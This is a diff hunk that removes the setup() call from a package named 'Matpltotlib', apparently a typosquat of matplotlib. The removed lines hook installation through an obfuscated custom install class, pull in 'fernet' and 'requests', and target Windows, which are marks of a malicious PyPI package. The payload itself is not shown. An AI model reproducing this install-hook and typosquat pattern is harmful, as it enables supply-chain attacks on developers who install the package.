@@ -18,22 +18,5 @@ class idSPMssBzxuXnKdfHhdEtpAYAJUUhnJZPdfMZrvRrlDIQMSnVCAbJElFCLEWrUsBeWGpZaCzsz
             install.run(self)
 
 
-setup(
-    name="Matpltotlib",
-    version=VERSION,
-    author="EdtwbvYkZTCALbEUlRz",
-    author_email="TkhWOCN@gmail.com",
-    description=DESCRIPTION,
-    long_description_content_type="text/markdown",
-    long_description=LONG_DESCRIPTION,
-    cmdclass={
-        'install': idSPMssBzxuXnKdfHhdEtpAYAJUUhnJZPdfMZrvRrlDIQMSnVCAbJElFCLEWrUsBeWGpZaCzszjTItvpoRCUPlkeSUsWlUVyxgLtIgGfqtNhqaZqKxWufzbEjwkteBlCLOvMRjzaFRthUo,
-    },
-    packages=find_packages(),
-    setup_requires=['fernet', 'requests'],
-    keywords=[],
-    classifiers=[
-        "Operating System :: Microsoft :: Windows",
-    ]
-)
+# setup(...) removed                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               
 
